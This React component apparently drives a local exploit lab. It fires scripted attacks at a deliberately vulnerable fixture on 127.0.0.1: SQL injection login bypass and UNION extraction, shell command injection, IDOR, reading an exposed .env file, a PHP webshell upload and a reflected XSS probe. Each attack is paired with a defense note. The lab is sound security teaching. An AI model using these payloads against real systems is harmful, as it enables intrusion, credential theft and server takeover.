import { useCallback, useEffect, useState } from 'react';

const LAB = (import.meta as any).env?.VITE_LAB_API || 'http://127.0.0.1:8790';

type Step = {
  id: string;
  n: string;
  phase: string;
  title: string;
  what: string;
  payload: string;
  run: () => Promise<string>;
  fix: string;
};

const enc = (s: string) => encodeURIComponent(s);

const post = async (path: string, body: string) => {
  const r = await fetch(LAB + path, {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body,
  });
  return await r.text();
};

const STEPS: Step[] = [
  {
    id: 'api', n: '01', phase: 'RECON',
    title: 'Exposed API — data disclosure',
    what: 'Attacker hits the API root without any token. Every user + role comes back in one request.',
    payload: `GET ${LAB}/api/users`,
    run: async () => { const r = await fetch(LAB + '/api/users'); return await r.text(); },
    fix: 'Require auth + role check on every /api/* route; never return whole tables.',
  },
  {
    id: 'sqli-err', n: '02', phase: 'EXPLOIT',
    title: 'SQLi — error-based confirmation',
    what: 'A single quote breaks the query and the DB error is reflected back. That error is the injectable signal.',
    payload: `POST /login  username='  password=x`,
    run: () => post('/login', 'username=' + enc("'") + '&password=x'),
    fix: 'Parameterized queries (? placeholders). Never concatenate input into SQL.',
  },
  {
    id: 'sqli-bypass', n: '03', phase: 'EXPLOIT',
    title: 'SQLi — authentication bypass',
    what: 'Commenting out the rest of the WHERE clause logs the attacker in as admin with no password.',
    payload: `POST /login  username=admin'--  password=x`,
    run: () => post('/login', 'username=' + enc("admin'--") + '&password=x'),
    fix: 'Prepared statements + rate-limit login + no verbose SQL errors.',
  },
  {
    id: 'sqli-union', n: '04', phase: 'EXPLOIT',
    title: 'SQLi — UNION exfiltration',
    what: 'Matching the column count, the attacker reads an arbitrary table (flags) through the login form.',
    payload: `POST /login  username=' UNION SELECT 1,name,value FROM flags --`,
    run: () => post('/login', 'username=' + enc("' UNION SELECT 1,name,value FROM flags --") + '&password=x'),
    fix: 'Parameterized queries; least-privilege DB user; validate input types.',
  },
  {
    id: 'idor', n: '05', phase: 'EXPLOIT',
    title: 'IDOR — read anyone\u2019s record',
    what: 'No authorization check on the object id. Incrementing the number returns someone else\u2019s data.',
    payload: `GET ${LAB}/api/user?id=2`,
    run: async () => { const r = await fetch(LAB + '/api/user?id=2'); return await r.text(); },
    fix: 'Server-side authorization: verify the requester owns (or may access) the object.',
  },
  {
    id: 'rce', n: '06', phase: 'EXECUTE',
    title: 'Command injection \u2192 RCE',
    what: 'The ping form passes the host straight to a shell. Appending a command runs it. This is where a web bug becomes code execution.',
    payload: `POST /admin/ping  host=127.0.0.1 & whoami`,
    run: () => post('/admin/ping', 'host=' + enc('127.0.0.1 & whoami')),
    fix: 'No shell interpolation. Allowlist commands or use execFile with an argument array.',
  },
  {
    id: 'secrets', n: '07', phase: 'PERSIST',
    title: 'Exposed secrets \u2192 credential reuse',
    what: 'Plain-text secrets in the web root let the attacker reach the DB, forge JWTs, and pivot to other services.',
    payload: `GET ${LAB}/.env`,
    run: async () => { const r = await fetch(LAB + '/.env'); return await r.text(); },
    fix: 'Keep secrets out of the web root; rotate exposed keys; use a secret manager.',
  },
  {
    id: 'upload', n: '08', phase: 'PERSIST',
    title: 'Unrestricted file upload \u2192 webshell drop',
    what: 'The /upload form accepts any file with no extension, MIME, or content check. Uploading a PHP webshell plants persistence on the server.',
    payload: `POST ${LAB}/upload  multipart  file=shell.php  ("<?php shell_exec($_GET['c']) ?>")`,
    run: async () => {
      const fd = new FormData();
      fd.append('file', new Blob(["<?php if(isset($_REQUEST['c'])){echo shell_exec($_REQUEST['c']);} ?>"], { type: 'application/x-php' }), 'shell.php');
      const r = await fetch(LAB + '/upload', { method: 'POST', body: fd });
      return await r.text();
    },
    fix: 'Validate extension + MIME + content; store outside the web root; randomize filenames; disable script execution in the upload dir.',
  },
  {
    id: 'xss', n: '09', phase: 'PERSIST',
    title: 'Reflected XSS \u2192 inject a form uploader',
    what: '/search echoes the q param unescaped. An attacker injects an upload form so a victim (or the attacker) can drop a PHP shell straight from the browser.',
    payload: `GET ${LAB}/search?q=<svg/onload=alert(1)>`,
    run: async () => { const r = await fetch(LAB + '/search?q=' + encodeURIComponent('<svg/onload=alert(1)>')); return await r.text(); },
    fix: 'Contextually escape output (HTML-encode); enforce a strict CSP; validate/sanitize reflected input.',
  },
];

const CHAIN = [
  'recon \u2192 /api/users (200)',
  '\u2193  learn "admin" exists',
  'SQLi auth bypass \u2192 session as admin',
  '\u2193  UNION \u2192 dump flags',
  'command injection \u2192 RCE',
  '\u2193  whoami / read files',
  'exposed .env \u2192 secrets / pivot',
  '\u2193  persistence',
  'upload webshell / XSS uploader \u2192 keep access',
];

function Arrow() {
  return <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.6" strokeLinecap="round" strokeLinejoin="round" aria-hidden="true"><path d="M4 12h16m-6-6 6 6-6 6" /></svg>;
}

export default function AttackerLab({ open, onClose }: { open: boolean; onClose: () => void }) {
  const [online, setOnline] = useState<'checking' | 'online' | 'offline'>('checking');
  const [results, setResults] = useState<Record<string, string>>({});
  const [running, setRunning] = useState<string | null>(null);
  const [active, setActive] = useState<string | null>(null);

  useEffect(() => {
    if (!open) return;
    const prev = document.body.style.overflow;
    document.body.style.overflow = 'hidden';
    return () => { document.body.style.overflow = prev; };
  }, [open]);

  useEffect(() => {
    if (!open) return;
    let alive = true;
    setOnline('checking');
    fetch(LAB + '/')
      .then(() => alive && setOnline('online'))
      .catch(() => alive && setOnline('offline'));
    return () => { alive = false; };
  }, [open]);

  const run = useCallback(async (step: Step) => {
    setRunning(step.id);
    setActive(step.id);
    try {
      const out = await step.run();
      setResults((r) => ({ ...r, [step.id]: out }));
    } catch (e) {
      setResults((r) => ({ ...r, [step.id]: 'ERR: ' + (e as Error).message }));
    } finally {
      setRunning(null);
    }
  }, []);

  if (!open) return null;

  return (
    <div className="recon lab" role="dialog" aria-modal="true" aria-label="Attacker-perspective exploit lab">
      <div className="recon-topbar">
        <div className="recon-title">
          <span className="recon-brand">exploit<span>.</span>lab</span>
          <span className="recon-sub">ATTACKER PERSPECTIVE / LOCAL FIXTURE ONLY</span>
        </div>
        <div className={'recon-status recon-status-' + online}>
          <i />
          {online === 'checking' ? 'CHECKING LAB' : online === 'online' ? 'LAB ONLINE' : 'LAB OFFLINE'}
        </div>
        <button className="recon-close" onClick={onClose}>Close <b aria-hidden="true">×</b></button>
      </div>

      <div className="recon-body lab-body">
        {online === 'offline' && (
          <div className="recon-offline">Lab offline. Start it with <code>node vuln-lab/server.mjs</code> (port 8790).</div>
        )}

        <div className="lab-intro">
          <span className="lab-kicker">THE FULL CHAIN — WHAT AN ATTACKER DOES AFTER FINDING A HOLE</span>
          <div className="lab-chain">
            {CHAIN.map((c, i) => <div key={i} className={'lab-chain-step' + (c.startsWith('\u2193') ? ' is-arrow' : '')}>{c}</div>)}
          </div>
          <p className="lab-disclaimer">Every exploit below runs against <code>127.0.0.1:8790</code> — a deliberately vulnerable fixture on your own machine. Never point these at a host you don&apos;t own.</p>
        </div>

        <div className="lab-steps">
          {STEPS.map((s) => (
            <div key={s.id} className={'lab-step' + (active === s.id ? ' is-active' : '')}>
              <button className="lab-step-head" onClick={() => setActive(active === s.id ? null : s.id)} aria-expanded={active === s.id}>
                <span className="lab-step-n">{s.n}</span>
                <span className="lab-step-phase">{s.phase}</span>
                <span className="lab-step-title">{s.title}</span>
                <span className="lab-step-toggle">{active === s.id ? '−' : '+'}</span>
              </button>

              {active === s.id && (
                <div className="lab-step-body">
                  <p className="lab-what">{s.what}</p>
                  <pre className="lab-payload">{s.payload}</pre>
                  <div className="lab-actions">
                    <button className="recon-start lab-run" onClick={() => run(s)} disabled={running === s.id || online !== 'online'}>
                      {running === s.id ? 'RUNNING…' : 'RUN EXPLOIT'} <Arrow />
                    </button>
                  </div>
                  {results[s.id] !== undefined && (
                    <pre className="lab-result">{results[s.id].slice(0, 1600)}</pre>
                  )}
                  <p className="lab-fix"><b>DEFENSE:</b> {s.fix}</p>
                </div>
              )}
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}
